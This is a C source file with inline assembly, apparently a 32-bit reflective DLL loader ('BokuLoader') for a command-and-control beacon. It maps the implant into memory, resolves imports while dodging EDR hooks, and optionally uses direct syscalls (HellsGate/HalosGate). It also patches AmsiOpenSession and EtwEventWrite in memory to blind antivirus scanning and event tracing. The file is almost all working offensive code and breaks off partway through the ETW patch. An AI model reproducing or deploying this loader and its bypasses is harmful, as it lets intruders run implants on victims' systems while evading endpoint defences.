#define WIN32_LEAN_AND_MEAN
/* Uncomment to enable features */
//#define NOHEADERCOPY // RDLL will not copy headers over to the loaded beacon
//#define BYPASS       // ETW & AMSI bypass switch. Comment out this line to disable
//#define SYSCALLS     // Use direct syscalls with HellGate & HalosGate instead of WINAPIs
#include <windows.h>

typedef struct Export {
    PVOID   Directory;
    ULONG32 DirectorySize;
    PVOID   AddressTable;
    PVOID   NameTable;
    PVOID   OrdinalTable;
    ULONG32 NumberOfNames;
}Export;

typedef struct Dll {
    void* dllBase;
    void* NewExeHeader;
    ULONG32 size;
    ULONG32 SizeOfHeaders;
    void* OptionalHeader;
    void* SizeOfOptionalHeader;
    void* NthSection;
    ULONG32 NumberOfSections;
    void* EntryPoint;
    void* TextSection;
    ULONG32 TextSectionSize;
    Export Export;
}Dll, *PDll;

typedef struct Section {
    void* RVA;
    void* dst_rdll_VA;
    void* src_rdll_VA;
    void* PointerToRawData;
    ULONG32 SizeOfSection;
    ULONG32 Characteristics;
}Section;

PVOID   getDllBase(LPCSTR) asm ("getDllBase");
PVOID   getFirstEntry(VOID) asm ("getFirstEntry");
PVOID   getNextEntry(PVOID currentEntry, PVOID firstEntry) asm ("getNextEntry");
PVOID   getDllBaseFromEntry(PVOID entry) asm ("getDllBaseFromEntry");
USHORT  getMachineType(PVOID) asm ("getMachineType");
VOID    Memcpy(PVOID destination, PVOID source, ULONG32 num) asm ("Memcpy");
PVOID   getExportDirectory(PVOID dllAddr) asm ("getExportDirectory");
ULONG   getExportDirectorySize(PVOID dllAddr) asm ("getExportDirectorySize");
PVOID   getExportAddressTable(PVOID dllBase, PVOID dllExportDirectory) asm ("getExportAddressTable");
PVOID   getExportNameTable(PVOID dllBase, PVOID dllExportDirectory) asm ("getExportNameTable");
PVOID   getExportOrdinalTable(PVOID dllBase, PVOID dllExportDirectory) asm ("getExportOrdinalTable");
ULONG32 getNumberOfNames(PVOID dllExportDirectory) asm ("getNumberOfNames");
PVOID   getSymbolAddress(PVOID symbolStr, ULONG StrSize, PVOID dllBase, PVOID AddressTable, PVOID NameTable, PVOID OrdinalTable, ULONG32 NumberOfNames) asm ("getSymbolAddress");
PVOID   xGetProcAddress(PVOID symbolStr, PDll dll);
PVOID   getRdllBase(PVOID) asm ("getRdllBase");
PVOID   getNewExeHeader(PVOID dllBase) asm ("getNewExeHeader");
ULONG32 getDllSize(PVOID newExeHeader) asm ("getDllSize");
ULONG32 getDllSizeOfHeaders(PVOID newExeHeader) asm ("getDllSizeOfHeaders");
PVOID   getOptionalHeader(PVOID NewExeHeader) asm ("getOptionalHeader");
PVOID   getSizeOfOptionalHeader(PVOID NewExeHeader) asm ("getSizeOfOptionalHeader");
PVOID   add(PVOID , PVOID ) asm ("add");
ULONG32 getNumberOfSections(PVOID newExeHeaderAddr) asm ("getNumberOfSections");
PVOID   getBeaconEntryPoint(PVOID newRdllAddr, PVOID OptionalHeaderAddr) asm ("getBeaconEntryPoint");
PVOID   getEip(void) asm ("getEip");
ULONG32 copyWithDelimiter(PVOID dst, PVOID src, ULONG32 n, CHAR delimiter) asm ("copyWithDelimiter");

#ifdef SYSCALLS
PVOID findSyscallNumber(PVOID ntdllApiAddr);
PVOID HellsGate(DWORD wSystemCall);
PVOID HellDescent();
PVOID halosGateDown(PVOID ntdllApiAddr, PVOID index);
PVOID halosGateUp(PVOID ntdllApiAddr, PVOID index);
DWORD getSyscallNumber(PVOID functionAddress);
#endif

typedef PVOID  (WINAPI * tLoadLibraryA)  (LPCSTR);
typedef PVOID  (WINAPI * tGetProcAddress)(PVOID, LPCSTR);

typedef LONG32 (NTAPI  * tNtProt)        (HANDLE, PVOID, PVOID, ULONG32, PVOID);
typedef LONG32 (NTAPI  * tNtAlloc)       (HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef LONG32 (NTAPI  * tNtFlush)       (HANDLE, PVOID, ULONG32);

typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, ULONG32, PVOID);

#ifdef BYPASS
void  bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, tNtProt pNtProtectVirtualMemory);
#endif

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

#ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) ((LONG32)(Status) >= 0)
#endif

__declspec(dllexport) void* WINAPI BokuLoader()
{
    LONG32 status;
    SIZE_T size;
    PVOID base;

    // get the current address
    PVOID BokuLoaderStart = getEip();

    // Initial Source Reflective DLL
    Dll rdll_src;
    rdll_src.dllBase              = getRdllBase(BokuLoaderStart); // search backwards from the start of BokuLoader
    rdll_src.NewExeHeader         = getNewExeHeader(rdll_src.dllBase);
    rdll_src.size                 = getDllSize(rdll_src.NewExeHeader);
    rdll_src.SizeOfHeaders        = getDllSizeOfHeaders(rdll_src.NewExeHeader);
    rdll_src.OptionalHeader       = getOptionalHeader(rdll_src.NewExeHeader);
    rdll_src.SizeOfOptionalHeader = getSizeOfOptionalHeader(rdll_src.NewExeHeader);
    rdll_src.NumberOfSections     = getNumberOfSections(rdll_src.NewExeHeader);

    // Get Export Directory and Export Tables for NTDLL.DLL
    char ws_ntdll[] = {'n','t','d','l','l','.','d','l','l',0};
    Dll ntdll;
    ntdll.dllBase              = getDllBase(ws_ntdll);
    ntdll.NewExeHeader         = getNewExeHeader(ntdll.dllBase);
    ntdll.Export.Directory     = getExportDirectory(ntdll.dllBase);
    ntdll.Export.DirectorySize = getExportDirectorySize(ntdll.dllBase);
    ntdll.Export.AddressTable  = getExportAddressTable(ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.NameTable     = getExportNameTable(ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.OrdinalTable  = getExportOrdinalTable(ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.NumberOfNames = getNumberOfNames(ntdll.Export.Directory);

    // check that the rDLL is the same architecture as the host process
    if(getMachineType(rdll_src.NewExeHeader) != getMachineType(ntdll.NewExeHeader)) {
        return NULL;
    }

    // Get Export Directory and Export Tables for Kernel32.dll
    char ws_k32[] = {'K','E','R','N','E','L','3','2','.','D','L','L',0};
    Dll k32;
    k32.dllBase              = getDllBase(ws_k32);
    k32.Export.Directory     = getExportDirectory(k32.dllBase);
    k32.Export.DirectorySize = getExportDirectorySize(k32.dllBase);
    k32.Export.AddressTable  = getExportAddressTable(k32.dllBase, k32.Export.Directory);
    k32.Export.NameTable     = getExportNameTable(k32.dllBase, k32.Export.Directory);
    k32.Export.OrdinalTable  = getExportOrdinalTable(k32.dllBase, k32.Export.Directory);
    k32.Export.NumberOfNames = getNumberOfNames(k32.Export.Directory);

    char kstr1[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    tLoadLibraryA pLoadLibraryA = xGetProcAddress(kstr1, &k32);

    char ntstr1[] = {'N','t','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0};
    tNtFlush pNtFlushInstructionCache = xGetProcAddress(ntstr1, &ntdll);

    char ntstr2[] = {'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtAlloc pNtAllocateVirtualMemory = xGetProcAddress(ntstr2, &ntdll);

    char ntstr3[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtProt pNtProtectVirtualMemory = xGetProcAddress(ntstr3, &ntdll);

    // AMSI & ETW Optional Bypass
    #ifdef BYPASS
    bypass(&ntdll, &k32, pLoadLibraryA, pNtProtectVirtualMemory);
    #endif

    // Allocate new memory to write our new RDLL too
    Dll rdll_dst;
    rdll_dst.dllBase = NULL;
    base = NULL;
    size = rdll_src.size;
    #ifdef SYSCALLS
    HellsGate(getSyscallNumber(pNtAllocateVirtualMemory));
    status = ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    #else
    status = pNtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    #endif
    if (!NT_SUCCESS(status))
        return NULL;

    rdll_dst.dllBase = base;

    // Optionally write Headers from initial source RDLL to loading beacon destination memory
    #ifndef NOHEADERCOPY
    Memcpy(rdll_dst.dllBase, rdll_src.dllBase, rdll_src.SizeOfHeaders);
    #endif

    // Save .text section address and size for destination RDLL so we can make it RE later
    BOOL textSectionFlag   = FALSE;
    rdll_dst.TextSection = NULL;
    rdll_dst.TextSectionSize = 0;
    DWORD numberOfSections = (DWORD)rdll_src.NumberOfSections;
    rdll_src.NthSection    = add(rdll_src.OptionalHeader, rdll_src.SizeOfOptionalHeader);
    Section section;
    while( numberOfSections-- )
    {
        __asm__(
            "add eax, 0xC \n"   // offsetof(IMAGE_SECTION_HEADER, VirtualAddress)
            "mov eax, [eax] \n"
            : "=r" (section.RVA)        // EAX OUT
            : "r" (rdll_src.NthSection) // EAX IN
        );
        section.dst_rdll_VA = add(rdll_dst.dllBase, section.RVA);
        __asm__(
            "add eax, 0x14 \n"  // offsetof(IMAGE_SECTION_HEADER, PointerToRawData)
            "mov eax, [eax] \n"
            : "=r" (section.PointerToRawData) // EAX OUT
            : "r" (rdll_src.NthSection)       // EAX IN
        );
        section.src_rdll_VA = add(rdll_src.dllBase, section.PointerToRawData);
        __asm__(
            "add eax, 0x10 \n"  // offsetof(IMAGE_SECTION_HEADER, SizeOfRawData)
            "mov eax, [eax] \n"
            : "=r" (section.SizeOfSection) // EAX OUT
            : "r" (rdll_src.NthSection)    // EAX IN
        );
        // check if this is the .text section
        if (textSectionFlag == FALSE)
        {
            __asm__(
                "mov ebx, [eax] \n"      // name of the section
                "mov eax, 0x0 \n"
                "mov edx, 0x7865742e \n" // 0x7865742e == '.tex'
                "cmp ebx, edx \n"
                "jne nottext \n"
                "mov eax, 0x1 \n"
                "nottext: \n"
                : "=r" (textSectionFlag)    // EAX OUT
                : "r" (rdll_src.NthSection) // EAX IN
            );
            // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
            if(textSectionFlag == TRUE)
            {
                rdll_dst.TextSection = section.dst_rdll_VA;
                rdll_dst.TextSectionSize = section.SizeOfSection;
            }
        }
        // Copy the section from the source address to the destination for the size of the section
        Memcpy(section.dst_rdll_VA, section.src_rdll_VA, section.SizeOfSection);
        // Get the address of the next section header and loop until there are no more sections
        rdll_src.NthSection += 0x28; // sizeof( IMAGE_SECTION_HEADER ) = 0x28
    }
    // Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
    void* DataDirectory = rdll_src.OptionalHeader + 0x68;
    // Get the Address of the Import Directory from the Data Directory
    void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *EntryAddress, *importNameRVA, *LookupTableEntry, *AddressTableEntry, *EntryName, *nullCheck;
    LPCSTR importName;
    __asm__(
        "mov ebx, [eax] \n" // RVA of Import Directory
        "add edx, ebx \n"   // Import Directory of beacon = RVA of Import Directory + New RDLL Base Address
        "xchg eax, edx \n"
        : "=r" (ImportDirectory) // EAX OUT
        : "r" (DataDirectory),   // EAX IN
          "r" (rdll_dst.dllBase) // EDX IN
    );
    void* nImportDesc = ImportDirectory;
    Dll dll_import;
    __asm__(
        "add edx, 0xC \n"   // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
        "mov edx, [edx] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
        "add eax, edx \n"   // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
        : "=r" (importNameRVA),   // EDX OUT
          "=r" (importName)       // EAX OUT
        : "r" (rdll_dst.dllBase), // EAX IN
          "r" (nImportDesc)       // EDX IN
    );
    // The last entry in the image import directory is all zeros
    while(importNameRVA)
    {
        dll_import.dllBase = getDllBase(importName);
        // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
        if (dll_import.dllBase == NULL){
            dll_import.dllBase = pLoadLibraryA(importName);
        }
        __asm__(
            "mov eax, [eax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into EBX
            "add eax, edx \n"   // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk
            : "=r" (LookupTableEntry) // EAX OUT
            : "r" (nImportDesc),      // EAX IN
              "r" (rdll_dst.dllBase)  // EDX IN
        );
        __asm__(
            "add eax, 0x10 \n"  // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descriptor
            "mov ebx, [eax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into EBX
            "add ebx, edx \n"   // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk
            "xchg eax, ebx \n"
            : "=r" (AddressTableEntry) // EAX OUT
            : "r" (nImportDesc),       // EAX IN
              "r" (rdll_dst.dllBase)   // EDX IN
        );
        __asm__(
            "mov eax, [eax] \n"
            : "=r" (nullCheck)        // EAX OUT
            : "r" (AddressTableEntry) // EAX IN
        );
        while(nullCheck)
        {
            dll_import.Export.Directory     = getExportDirectory(dll_import.dllBase);
            dll_import.Export.DirectorySize = getExportDirectorySize(dll_import.dllBase);
            dll_import.Export.AddressTable  = getExportAddressTable(dll_import.dllBase, dll_import.Export.Directory);
            dll_import.Export.NameTable     = getExportNameTable(dll_import.dllBase, dll_import.Export.Directory);
            dll_import.Export.OrdinalTable  = getExportOrdinalTable(dll_import.dllBase, dll_import.Export.Directory);
            dll_import.Export.NumberOfNames = getNumberOfNames(dll_import.Export.Directory);

            if( LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
            {
                __asm__( // Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
                    "add eax, 0x10 \n"  // DWORD Base; // 0x10 offset // ECX = &importedDllBaseOrdinal
                    "mov eax, [eax] \n" // EAX = importedDllBaseOrdinal (Value/DWORD)
                    : "=r" (BaseOrdinal)                // EAX OUT
                    : "r" (dll_import.Export.Directory) // EAX IN
                );
                __asm__( // Import Hint from the modules Hint/Name table
                    "mov eax, [eax] \n"  // EAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
                    "and eax, 0xFFFF \n" // get rid of the 8
                    : "=r" (importEntryHint) // EAX OUT
                    : "r" (LookupTableEntry) // EAX IN
                );
                __asm__( // Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
                    "sub eax, edx \n" // Import Hint from Hint/Name Table (first 2 bytes before the name string)
                    : "=r" (TableIndex)      // EAX OUT
                    : "r" (importEntryHint), // EAX IN
                      "r" (BaseOrdinal)      // EDX IN
                );
                 __asm__( // The ExportAddressTable/AddressOfFunctions holds DWORD (4 byte) RVA's for the executable functions/api's address
                    "mov esi, edx \n"
                    "mov ebx, 0x4 \n"   // sizeof(DWORD) - This is because each entry in the table is a 4 byte DWORD which is the RVA/offset for the actual executable functions address
                    "mul ebx \n"        // importEntryExportTableIndex * sizeof(DWORD)
                    "add eax, esi \n"   // RVA for our functions address
                    "mov eax, [eax] \n" // The RVA for the executable function we are importing
                    "add eax, ecx \n"   // The executable address within the imported DLL for the function we imported
                    : "=r" (EntryAddress)                  // EAX OUT
                    : "r"(TableIndex),                     // EAX IN - importEntryExportTableIndex
                      "r"(dll_import.Export.AddressTable), // EDX IN - AddressTable
                      "r" (dll_import.dllBase)             // ECX IN - dllBase
                );
                // patch in the address for this imported function
                __asm__(
                    "mov [eax], edx \n" // write the address of the imported api to our import table
                    : // no outputs
                    : "r" (AddressTableEntry), // EAX IN = The import table entry we are going to overwrite
                      "r" (EntryAddress)       // EDX IN
                 );
            }
            else
            {
                __asm__( // If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
                    "mov eax, [eax] \n" // RVA for our functions Name/Hint table entry
                    "add eax, edx \n"   // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
                    "add eax, 0x2 \n"   // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
                    : "=r" (EntryName)         // EAX OUT
                    : "r" (AddressTableEntry), // EAX IN = import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
                      "r" (rdll_dst.dllBase)   // EDX IN
                );
                // use xGetProcAddress to dodge EDR hooks on GetProcAddress() and patch in the address for this imported function
                EntryAddress = xGetProcAddress(EntryName, &dll_import);
                __asm__(
                    "mov [eax], edx \n" // write the address of the imported api to our import table
                    : // no outputs
                    : "r" (AddressTableEntry), // EAX IN = import table entry we are going to overwrite
                      "r" (EntryAddress)       // EDX IN
                );
            }
            AddressTableEntry += 0x4;
            if(LookupTableEntry)
                LookupTableEntry += 0x4; // TODO: not sure here
            __asm__(
                "mov eax, [eax] \n"
                : "=r" (nullCheck)        // EAX OUT
                : "r" (AddressTableEntry) // EAX IN
            );
        }
        nImportDesc += 0x14; // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
        __asm__( // Do this again for the next module/DLL in the Import Directory
            "add eax, 0xC \n"   // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
            "mov eax, [eax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name 
            "add edx, eax \n"   // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
            : "=r" (importName),     // EDX OUT
              "=r" (importNameRVA)   // EAX OUT
            : "r" (nImportDesc),     // EAX IN
              "r" (rdll_dst.dllBase) // EDX IN
        );
    }
    void* nextRelocBlock, *RelocDirSize, *BaseAddressDelta, *relocBlockSize, *relocVA, *RelocBlockEntries, *nextRelocBlockEntry;
    __asm__(
        "add edx, 0x1c \n"  // OptionalHeader.ImageBase
        "mov edx, [edx] \n"
        "sub eax, edx \n"   // dllBase.ImageBase
        : "=r" (BaseAddressDelta)       // EAX OUT
        : "r" (rdll_dst.dllBase),       // EAX IN
          "r" (rdll_src.OptionalHeader) // EDX IN
    );
    void* RelocDir = rdll_src.OptionalHeader + 0x88; // OptionalHeader+0x88 = &DataDirectory[Base Relocation Table]
    __asm__(
        "add eax, [edx] \n" // 4 byte DWORD Virtual Address of the Relocation Directory table, newRelocationTableAddr = dllBase + RVAnewRelocationTable
        : "=r" (nextRelocBlock)   // EAX OUT
        : "r" (rdll_dst.dllBase), // EAX IN
          "r" (RelocDir)          // EDX IN
    );
    __asm__(
        "mov eax, [eax+0x4] \n" // 4 byte DWORD Size of the Relocation Directory table
        : "=r" (RelocDirSize) // EAX OUT
        : "r" (RelocDir)      // EAX IN
    );
    if(RelocDirSize && BaseAddressDelta) // check if their are any relocations present
    {
        __asm__(
            "mov eax, [eax+0x4] \n" // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
            : "=r" (relocBlockSize) // EAX OUT
            : "r" (nextRelocBlock)  // EAX IN
        );
        while(relocBlockSize)
        {
            __asm__(
                "add eax, [edx] \n" // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress + nextRelocationBlockRVA = VA of next Relocation Block
                : "=r" (relocVA)          // EAX OUT
                : "r" (rdll_dst.dllBase), // EAX IN
                  "r" (nextRelocBlock)    // EDX IN
            );
            __asm__(
                "xor edx, edx \n"
                "mov ebx, 0x2 \n" // 0x2 = size of image relocation WORD
                "sub ax, 0x8 \n"  // Minus the 8 byte IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
                "div bx \n"       // relocBlockSize/2
                : "=r" (RelocBlockEntries) // EAX OUT
                : "r" (relocBlockSize)     // EAX IN
            );
            nextRelocBlockEntry = nextRelocBlock + 0x8;
            while( RelocBlockEntries-- )
            {
                __asm__(
                    "xor ebx, ebx \n"
                    "mov bx, [eax] \n"   // 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
                    "mov eax, ebx \n"
                    "shr ebx, 0x0C \n"   // Check the 4 bit type
                    "cmp bl, 0x3 \n"     // IMAGE_REL_BASED_HIGHLOW?
                    "jne badtype \n"
                    "shl eax, 0x14 \n"   // only keep the last 12 bits of EAX by shaking the EAX register
                    "shr eax, 0x14 \n"   // the last 12 bits is the offset, the first 4 bits is the type
                    "add edx, eax \n"    // in memory Virtual Address of our current relocation entry
                    "mov ebx, [edx] \n"  // value of the relocation entry
                    "add ebx, ecx \n"    // value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
                    "mov [edx], ebx \n"  // WRITE THAT RELOC!
                    "badtype:\n"
                    : // no outputs
                    : "r" (nextRelocBlockEntry), // EAX IN
                      "r" (relocVA),             // EDX IN
                      "r" (BaseAddressDelta)     // ECX IN
                );
                nextRelocBlockEntry += 0x2;
            }
            nextRelocBlock = add(nextRelocBlock, relocBlockSize);
            __asm__(
                "mov eax, [eax+0x4] \n" // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
                : "=r" (relocBlockSize) // EAX OUT
                : "r" (nextRelocBlock)  // EAX IN
            );
        }
    }

    ULONG32 oldprotect = 0;
    base = rdll_dst.TextSection;
    size = rdll_dst.TextSectionSize;
    #ifdef SYSCALLS
    HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
    status = ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, &oldprotect);
    if (!NT_SUCCESS(status))
        return NULL;

    HellsGate(getSyscallNumber(pNtFlushInstructionCache));
    status = ((tNtFlush)HellDescent)(NtCurrentProcess(), NULL, 0);
    if (!NT_SUCCESS(status))
        return NULL;
    #else
    status = pNtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, &oldprotect);
    if (!NT_SUCCESS(status))
        return NULL;

    status = pNtFlushInstructionCache(NtCurrentProcess(), NULL, 0);
    if (!NT_SUCCESS(status))
        return NULL;
    #endif
   
    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
    ((DLLMAIN)rdll_dst.EntryPoint)(rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
    return rdll_dst.EntryPoint;
}

PVOID xGetProcAddress(PVOID symbolStr, PDll dll)
{
    CHAR  dll_name[64];
    CHAR  api_name[128];
    DWORD api_length, i;
    Dll   ref_dll;
    PVOID firstEntry;
    PVOID currentEntry;
    DWORD StrSize;

    // if there is no export directory, return NULL
    if (!dll->Export.DirectorySize)
        return NULL;

    __asm__(
        "xor ecx, ecx \n"        // Get the string length for the import function name
        "countLoop: \n"
        "inc cl \n"              // increment the name string length counter
        "xor ebx, ebx \n"
        "cmp bl, [eax] \n"       // are we at the null terminator for the string?
        "je fStrLen \n"
        "inc eax \n"             // move to the next char of the string
        "jmp short countLoop \n"
        "fStrLen: \n"
        "xchg eax, ecx \n"
        : "=r" (StrSize)  // EAX OUT
        : "r" (symbolStr) // EAX IN
    );

    PVOID address = getSymbolAddress(symbolStr, StrSize, dll->dllBase, dll->Export.AddressTable, dll->Export.NameTable, dll->Export.OrdinalTable, dll->Export.NumberOfNames);

    // if not found, return NULL
    if (!address)
        return NULL;

    // is this a forward reference?
    if ((ULONG_PTR)address >= (ULONG_PTR)dll->Export.Directory &&
        (ULONG_PTR)address <  (ULONG_PTR)dll->Export.Directory + dll->Export.DirectorySize)
    {
        // copy DLL name
        i = copyWithDelimiter(dll_name, address, sizeof(dll_name) - 4, '.');
        i--;
        dll_name[i+1] = 'd';
        dll_name[i+2] = 'l';
        dll_name[i+3] = 'l';
        dll_name[i+4] = 0;

        address += i + 1;

        // copy API name
        i = copyWithDelimiter(api_name, address, sizeof(api_name) - 1, 0);
        i--;
        api_name[i] = 0;
        api_length = i + 1;

        // see if the DLL is already loaded
        ref_dll.dllBase = getDllBase(dll_name);
        if (ref_dll.dllBase)
        {
            ref_dll.Export.Directory     = getExportDirectory(ref_dll.dllBase);
            ref_dll.Export.AddressTable  = getExportAddressTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.NameTable     = getExportNameTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.OrdinalTable  = getExportOrdinalTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.NumberOfNames = getNumberOfNames(ref_dll.Export.Directory);
            return xGetProcAddress(api_name, &ref_dll);
        }

        // the DLL was not found by name
        // loop over each loaded DLL until we find the correct one
        firstEntry = getFirstEntry();
        currentEntry = firstEntry;
        do
        {
            ref_dll.dllBase = getDllBaseFromEntry(currentEntry);
            // ignore the original DLL with the reference
            if (ref_dll.dllBase == dll->dllBase)
            {
                currentEntry = getNextEntry(currentEntry, firstEntry);
                continue;
            }

            ref_dll.Export.Directory     = getExportDirectory(ref_dll.dllBase);
            ref_dll.Export.DirectorySize = getExportDirectorySize(ref_dll.dllBase);
            // make sure it has an export directory
            if (!ref_dll.Export.DirectorySize)
            {
                currentEntry = getNextEntry(currentEntry, firstEntry);
                continue;
            }
            ref_dll.Export.AddressTable  = getExportAddressTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.NameTable     = getExportNameTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.OrdinalTable  = getExportOrdinalTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.NumberOfNames = getNumberOfNames(ref_dll.Export.Directory);
            // try to find 'api_name' in this DLL
            address = getSymbolAddress(api_name, api_length, ref_dll.dllBase, ref_dll.Export.AddressTable, ref_dll.Export.NameTable, ref_dll.Export.OrdinalTable, ref_dll.Export.NumberOfNames);
            // found?
            if (address)
                break;
            // try the next DLL
            currentEntry = getNextEntry(currentEntry, firstEntry);
        } while(currentEntry);
    }

    return address;
}

#ifdef BYPASS
void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, tNtProt pNtProtectVirtualMemory){
    LONG32 status;
    PVOID Base;
    SIZE_T Size;
    unsigned long oldprotect;

    // ######### AMSI.AmsiOpenSession Bypass
    char as[] = {'a','m','s','i','.','d','l','l',0};
    Dll amsi;
    amsi.dllBase = getDllBase(as); // check if amsi.dll is already loaded into the process
    if (amsi.dllBase == NULL){ // If the AMSI.DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
        amsi.dllBase = pLoadLibraryA(as);
    }

    if (amsi.dllBase != NULL) {
        amsi.Export.Directory     = getExportDirectory(amsi.dllBase);
        amsi.Export.AddressTable  = getExportAddressTable(amsi.dllBase, amsi.Export.Directory);
        amsi.Export.NameTable     = getExportNameTable(amsi.dllBase, amsi.Export.Directory);
        amsi.Export.OrdinalTable  = getExportOrdinalTable(amsi.dllBase, amsi.Export.Directory);
        amsi.Export.NumberOfNames = getNumberOfNames(amsi.Export.Directory);
        char aoses[] = {'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0};
        void* pAmsiOpenSession  = xGetProcAddress(aoses, &amsi);
        if (pAmsiOpenSession) {

            unsigned char amsibypass[] = { 0x31, 0xC0 }; // xor eax, eax
            Base = pAmsiOpenSession;
            Size = sizeof(amsibypass);

            #ifdef SYSCALLS
            // make memory region RWX
            HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
            status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!NT_SUCCESS(status))
                return;
            // write the bypass
            Memcpy(pAmsiOpenSession, amsibypass, sizeof(amsibypass));
            // make memory region RX again
            HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
            status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
            if (!NT_SUCCESS(status))
                return;
            #else
            // make memory region RWX
            status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!NT_SUCCESS(status))
                return;
            // write the bypass
            Memcpy(pAmsiOpenSession, amsibypass, sizeof(amsibypass));
            // make memory region RX again
            status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
            if (!NT_SUCCESS(status))
                return;
            #endif
        }
    }

    // ######### ETW.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
    char eew[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
    void* pEtwEventWrite  = xGetProcAddress(eew, ntdll);

    if (pEtwEventWrite != NULL) {
        unsigned char etwbypass[] = { 0xc3 }; // ret
        Base = pEtwEventWrite;
        Size = sizeof(etwbypass);
        #ifdef SYSCALLS
        // make memory region RWX
        HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
        status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
        if (!NT_SUCCESS(status))
            return;
        // write the bypass
        Memcpy(pEtwEventWrite, etwbypass, sizeof(etwbypass));
        // make memory region RX again
        HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
        status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
        if (!NT_SUCCESS(status))
            return;
        #else
        // make memory region RWX
        status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
        if (!NT_SUCCESS(status))
            return;
        // write the bypass
